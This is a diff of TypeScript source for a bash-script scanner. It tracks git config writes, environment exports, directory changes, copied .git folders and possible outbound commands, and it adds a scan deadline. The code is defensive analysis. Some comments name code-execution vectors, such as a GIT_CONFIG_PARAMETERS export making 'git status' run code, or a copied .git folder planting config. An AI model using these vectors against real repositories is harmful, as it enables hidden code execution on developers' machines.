+        plainCopies.add(id);
+        return;
+      }
+      const operands = copyOperands(program, rest);
+      const target = copyTarget(program, rest)?.value ?? operands.at(-1);
+      if (target === undefined) return;
+      let holdsGit = false;
+      // A source the scan cannot read may hold anything, so the copy may write config wherever git reads it.
+      let unread = false;
+      // A folder a glob matched is copied into the target under its own name.
+      const nested: string[] = [];
+      const holds = async (place: string): Promise<boolean> =>
+        (await stat(join(place, '.git')).then(
+          () => true,
+          () => false
+        )) || /(^|\/)\.git(\/|$)/.test(place);
+      for (const source of operands.filter(operand => operand !== target)) {
+        const path = expand(unquote(source));
+        const words = isDynamic(path) || (state.lost && !isAbsolutePath(path)) ? null : operandWords(source, scope());
+        const word = words?.length === 1 ? (words[0] as OperandWord) : null;
+        if (word === null || word.expandAt !== null) {
+          holdsGit = unread = true;
+          break;
+        }
+        if (word.glob.includes(true)) {
+          const found = await globExpansion(word, state.cwd, dotGlob, stopped);
+          if (found === null) {
+            holdsGit = unread = true;
+            break;
+          }
+          for (const { path: match } of found) {
+            if (await holds(match)) {
+              holdsGit = true;
+              nested.push(posix.basename(match));
+            }
+          }
+          continue;
+        }
+        for (const place of operandTargets(state.cwd, path)) {
+          const found = (await stat(place).catch(() => null)) !== null;
+          // A source not there yet is plain unless an earlier write of this script may put a `.git` in it.
+          if ((await holds(place)) || writtenGitBelow(place, id)) {
+            holdsGit = true;
+            if (!found) unread = true;
+          }
+        }
+      }
+      if (unread) configWrites.push({ id });
+      if (!holdsGit) {
+        plainCopies.add(id);
+        return;
+      }
+      const text = expand(unquote(target));
+      if (isDynamic(text) || (state.lost && !isAbsolutePath(text))) {
+        configWrites.push({ id });
+        return;
+      }
+      for (const place of operandTargets(state.cwd, text)) {
+        configWrites.push({ id, path: join(place, '.git', 'config') });
+        for (const name of nested) configWrites.push({ id, path: join(place, name, '.git', 'config') });
+      }
     };
 
     const redirect = async (node: Node): Promise<void> => {
@@ -825,10 +9499,40 @@ export async function scanShell(
       const text = unquote(target.text);
       if (HARMLESS_REDIRECT_TARGETS.has(text) || text.startsWith('&')) return;
       if (!WRITE_OPERATORS.has(redirectOperator(node) ?? '')) noteEnvFile(target.text);
+      else {
+        const outer = writer;
+        writer = node.id;
+        try {
+          noteWrite(target.text);
+        } finally {
+          writer = outer;
+        }
+      }
       await check(target.text, state.cwd);
     };
 
-    const visit = async (node: Node): Promise<void> => {
+    /**
+     * Binds a top-level `NAME=literal` the script sets nowhere else, so a later `$NAME/x` reads as the path bash
+     * builds. A set the scan cannot pin (quoted or expanded value, a second or conditional set, a subshell or list,
+     * unset, eval, sourcing, IFS) stays unbound, so a word using it stays unread.
+     */
+    const bindLiteral = (node: Node): void => {
+      if (node.type !== 'variable_assignment' || node.parent?.type !== 'program') return;
+      if (branching > 0 || sourced || state.lost || MAY_UNBIND.test(gateText)) return;
+      // `NAME=x &` sets it in a subshell, so later words see the variable unset.
+      if (backgrounded || node.nextSibling?.type === '&') return;
+      if (node.children.some(child => child?.type === '+=')) return;
+      const name = node.childForFieldName('name');
+      const value = node.childForFieldName('value');
+      if (name?.type !== 'variable_name' || UNBOUND_NAMES.test(name.text)) return;
+      if (!value || !LITERAL_VALUE.test(value.text)) return;
+      const sets = variables.set.filter(each => each.name.replace(/\[[^]*$/, '') === name.text);
+      if (sets.length !== 1 || sets[0]?.uncertainOrder || sets[0]?.prefixOf !== undefined) return;
+      literalBindings.set(name.text, value.text);
+    };
+
+    const visitNode = async (node: Node): Promise<void> => {
+      if (!state.lost) visited.add(state.cwd);
       if (node.type === 'command') return run(node);
       // `export X=..`, `declare -x X=..` and a statement-level `X=..` set the environment every
       // later command inherits - `GIT_CONFIG_PARAMETERS` runs code through a plain `git status` -
@@ -839,8 +9543,10 @@ export async function scanShell(
         (node.type === 'variable_assignment' && !ASSIGNMENT_OWNERS.has(node.parent?.type ?? ''))
       ) {
         commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
-        contained = false;
+        potentialOutbound = true;
+        setsEnvironment = true;
         for (const child of node.children) if (child) await visit(child);
+        bindLiteral(node);
         return;
       }
       // `select` parses as a for_statement too; its header rebinds a variable that may be
@@ -849,11 +9555,58 @@ export async function scanShell(
         const body = node.childForFieldName('body');
         const header = body ? node.text.slice(0, body.startIndex - node.startIndex).replace(/[\s;]+$/, '') : node.text;
         commands.push({ text: header, always: header, coverable: false, words: header });
-        contained = false;
-        for (const child of node.children) if (child) await visit(child);
+        const variable = node.childForFieldName('variable')?.text ?? '';
+        // A lowercase name with no underscore is no variable a listed program reads (`HOME`,
+        // `GIT_DIR` and `http_proxy` all fail it), so that binding does not change the environment.
+        if (!/^[a-z][a-z0-9]*$/.test(variable)) {
+          potentialOutbound = true;
+          setsEnvironment = true;
+        }
+        const values = node.childrenForFieldName('value').map(value => value?.text ?? '');
+        const bind =
+          loopBinds(node.text.startsWith('for'), variable, values, body?.text ?? '', functions) && !state.lost;
+        const outer = loopBindings.get(variable);
+        if (bind) loopBindings.set(variable, { values, unquoted: !/\bIFS\b/.test(gateText) });
+        else loopBindings.delete(variable);
+        try {
+          for (const child of node.children) if (child) await visit(child);
+        } finally {
+          if (outer) loopBindings.set(variable, outer);
+          else loopBindings.delete(variable);
+        }
         return;
       }
-      if (node.type === 'redirected_statement' && hasWriteRedirect(node)) {
+      if (node.type === 'redirected_statement') {
+        if (await visitRedirected(node)) state.lost = true;
+        return;
+      }
+      if (node.type === 'file_redirect') {
+        for (const child of node.children) if (child && child.type !== 'file_descriptor') await visit(child);
+        return redirect(node);
+      }
+      if (SUBSHELLS.has(node.type) || node.type === 'pipeline') {
+        const saved = snapshot();
+        const isolate = SUBSHELLS.has(node.type);
+        let moved = false;
+        for (const child of node.children) {
+          if (!child) continue;
+          if (!isolate) restore(saved);
+          await visit(child);
+          if (!samePlace(saved, state)) moved = true;
+        }
+        restore(saved);
+        if (lastpipe && moved && node.type === 'pipeline') Object.assign(state, { lost: true, stackLost: true });
+        return;
+      }
+      for (const child of node.children) if (child) await visit(child);
+    };
+
+    /**
+     * A statement with redirects. The parser hangs `a && b > f` off the whole list, but bash opens `f` for `b`,
+     * where the list succeeds; true, as for visitList, when a failure could leave bash somewhere else.
+     */
+    const visitRedirected = async (node: Node): Promise<boolean> => {
+      if (hasWriteRedirect(node)) {
         const body = node.childForFieldName('body');
         if (body?.type === 'command') {
           writtenCommands.add(body.id);
@@ -861,34 +9614,179 @@ export async function scanShell(
           commands.push({ text: node.text, always: node.text, coverable: false, words: node.text });
         }
       }
-      if (node.type === 'file_redirect') {
-        for (const child of node.children) if (child && child.type !== 'file_descriptor') await visit(child);
-        return redirect(node);
-      }
-      if (SUBSHELLS.has(node.type) || node.type === 'pipeline') {
-        const saved = { cwd: state.cwd, previous: state.previous, stack: [...state.stack] };
-        const isolate = SUBSHELLS.has(node.type);
+      const before = unreadOperands;
+      let uncertain = false;
+      unreadOwners++;
+      try {
         for (const child of node.children) {
-          if (!child) continue;
-          if (!isolate) Object.assign(state, { cwd: saved.cwd, previous: saved.previous, stack: [...saved.stack] });
-          await visit(child);
+          if (child?.type === 'list') uncertain = (await visitList(child)) || uncertain;
+          else if (child) await visit(child);
         }
-        Object.assign(state, saved);
+      } finally {
+        unreadOwners--;
+      }
+      if (unreadOperands > before) {
+        const entry: ShellCommand = { text: node.text, always: node.text, coverable: false, words: node.text };
+        commands.push(entry);
+        claimUnread(before, entry);
+      }
+      return uncertain;
+    };
+
+    /**
+     * `a && b` or `a || b`, leaving the state where bash is when the list succeeds: `b` after `a &&` runs only
+     * once `a`, and any cd in it, succeeded. True when a failure could leave bash somewhere else.
+     */
+    const visitList = async (node: Node): Promise<boolean> => {
+      const [left, right] = node.namedChildren.filter(child => child !== null && child.type !== 'comment');
+      const operator = node.children.find(child => child?.type === '&&' || child?.type === '||')?.type;
+      if (!left || !right || node.namedChildren.length !== 2 || operator === undefined) {
+        for (const child of node.children) if (child) await visit(child);
+        return true;
+      }
+      const statement = async (child: Node): Promise<boolean> => {
+        if (child.type === 'list') return visitList(child);
+        listMembers.add(child.id);
+        if (child.type === 'redirected_statement') return visitRedirected(child);
+        await visit(child);
+        return false;
+      };
+      const before = snapshot();
+      const leftUncertain = await statement(left);
+      const middle = snapshot();
+      // `b` after `a ||` runs where a failed `a` left bash: where it started, or wherever its cd took it.
+      if (operator === '||' && (leftUncertain || !samePlace(before, middle))) state.lost = true;
+      const rightUncertain = await statement(right);
+      const after = snapshot();
+      if (operator === '||' && !samePlace(middle, after)) state.lost = true;
+      return leftUncertain || rightUncertain || !samePlace(before, middle) || !samePlace(middle, after);
+    };
+
+    const visit = async (node: Node): Promise<void> => {
+      if (expired) return;
+      if (braceExpandedWords(node).some(braceScanDiffers)) unreadOperands++;
+      // A loop or function body may run a git call again after a later one in it moved a ref.
+      if (REPEATS.has(node.type) && /\bgit\b/.test(node.text)) gitScript.refsMoved = true;
+      if (node.type === 'list') {
+        if (await visitList(node)) state.lost = true;
         return;
       }
-      for (const child of node.children) if (child) await visit(child);
+      if (node.type === 'function_definition') {
+        // A function standing in for a program the scan models or looks through would read as that program.
+        const defined = node.childForFieldName('name')?.text ?? '';
+        if (!PLAIN_PROGRAM.test(defined) || MODELED_PROGRAMS.has(defined) || WRAPPERS.has(defined)) unreadOperands++;
+        // The body runs wherever the function is called, so it is read from no known folder.
+        const before = snapshot();
+        const changes = directoryChanges;
+        state.lost = true;
+        branching++;
+        try {
+          await visitNode(node);
+        } finally {
+          branching--;
+        }
+        restore(before);
+        if (directoryChanges > changes) Object.assign(state, { lost: true, stackLost: true });
+        return;
+      }
+      if (BRANCHES.has(node.type)) {
+        const before = snapshot();
+        branching++;
+        try {
+          await visitNode(node);
+        } finally {
+          branching--;
+        }
+        if (!samePlace(before, state)) state.lost = true;
+        return;
+      }
+      return visitNode(node);
     };
 
     await visit(tree.rootNode);
+    for (const { own, anywhere, alongside } of laterChecks) {
+      if (touchedBy.some(id => !own.has(id) && (anywhere || alongside.has(id)))) unreadOperands++;
+    }
+    for (const { own, anywhere, alongside, configs, form, reason } of historyChecks) {
+      const racing = (id: number): boolean => id !== own && (anywhere || alongside.has(id));
+      const kinds = changesOf(racing);
+      const finding = kinds.size > 0 ? await reason(kinds) : null;
+      const part = entries.get(own);
+      if (finding?.asks && part !== undefined) {
+        if (!part.entry.gitSigningRisk) {
+          Object.assign(part.entry, {
+            coverable: false,
+            words: part.original,
+            gitUnlisted: `${form} ${finding.text}`,
+            gitSigningRisk: true,
+          });
+        }
+      } else if (
+        finding !== null ||
+        (configs && configWrites.some(write => racing(write.id) && !plainConfigWriters.has(write.id)))
+      ) {
+        unreadOperands++;
+        deferredSigningRisk = true;
+      }
+    }
+    for (const check of aliasChecks) {
+      const { own, anywhere, alongside } = check;
+      const racing = (id: number): boolean => id !== own && (anywhere || alongside.has(id));
+      for (const write of configWrites) {
+        if (check.signing && plainConfigWriters.has(write.id)) continue;
+        if (racing(write.id) && (await aliasConfigTouched(write, check))) {
+          unreadOperands++;
+          if (check.signing) deferredSigningRisk = true;
+          break;
+        }
+      }
+    }
+    if (homeGuessed) return null;
+    const unreadScript = unreadOperands > claimedUnread || (unreadOperands > 0 && ranLost);
+    if (unreadScript) {
+      for (const entry of commands) {
+        entry.coverable = false;
+        delete entry.unread;
+        delete entry.refsMovedOnly;
+      }
+    }
+    if (setsEnvironment) for (const entry of commands) if (entry.outbound) entry.outbound.target = null;
     return {
       commands,
+      ...(deferredSigningRisk ? { gitSigningRisk: true as const } : {}),
       paths: [...paths],
+      ...(globFolders.size > 0 ? { globFolders: [...globFolders] } : {}),
+      ...(dotlessGlobFolders.size > 0 ? { dotlessGlobFolders: [...dotlessGlobFolders] } : {}),
       directories: [...directories],
+      ungranted: [...ungranted],
       envFiles: [...envFiles],
       outbound: [...outbound],
-      contained: contained && commands.length > 0,
+      potentialOutbound: potentialOutbound || commands.length === 0,
+      sends: setsEnvironment ? sends.map(({ reason }) => ({ reason, target: null })) : sends,
+      readOnly: readOnly && !setsEnvironment && commands.length > 0,
+      writes: [...writes],
+      writtenTrees: [...writtenTrees],
+      writtenPlaces: [...writtenPlaces],
+      ...(unreadOperands > 0 ? { unread: true as const } : {}),
+      ...(unreadScript ? { unreadScript: true as const } : {}),
+      ...(setsEnvironment ? { setsEnvironment: true as const } : {}),
+      ...(gitProgram ? { gitProgram } : {}),
+      ...(pathUnplaced ? { gitPathUnplaced: true as const } : {}),
+      ...(remoteTree ? { remoteTree: true as const } : {}),
     };
+  }).finally(() => tree.delete());
+
+  // A scan that outlives its deadline reads as one it could not follow; its walks and checks stop at their next step.
+  let timer: ReturnType<typeof setTimeout> | undefined;
+  const deadline = new Promise<null>(resolve => {
+    timer = setTimeout(() => {
+      expired = true;
+      resolve(null);
+    }, deadlineMs);
+  });
+  try {
+    return await Promise.race([scanning, deadline]);
   } finally {
-    tree.delete();
+    clearTimeout(timer);
   }
 }
